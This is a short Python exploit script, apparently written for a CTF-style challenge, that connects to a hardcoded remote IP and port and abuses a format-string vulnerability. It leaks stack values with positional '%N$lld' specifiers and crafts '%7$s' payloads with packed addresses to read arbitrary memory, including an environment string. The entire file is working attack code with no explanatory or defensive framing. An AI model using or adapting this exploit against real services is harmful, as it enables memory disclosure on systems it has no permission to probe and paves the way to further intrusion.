#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
def ask(fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.1)
    try: return s.recv(4096)
    except Exception as e: return b'<T:'+str(e).encode()

def leak_lld(n):
    d=ask("%%%d$lld" % n)
    m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None

def readmem(X):
    # arg7 reads buffer[8:16]; %7$s at buffer[0:4], pad to buffer[8], X at buffer[8:16]
    fmt = b"%7$s" + b"AAAA" + struct.pack("<Q", X)
    return ask(fmt)

B = leak_lld(2)
print("B=", hex(B))
print("read(B) =>", repr(readmem(B)))
# read an env string: arg50 points to "SHELL=/bin/bash"
# first leak arg50 value then read from it
a50 = leak_lld(50)
print("arg50=", hex(a50 if a50 else 0))
if a50:
    print("read(arg50) =>", repr(readmem(a50)))
s.close()
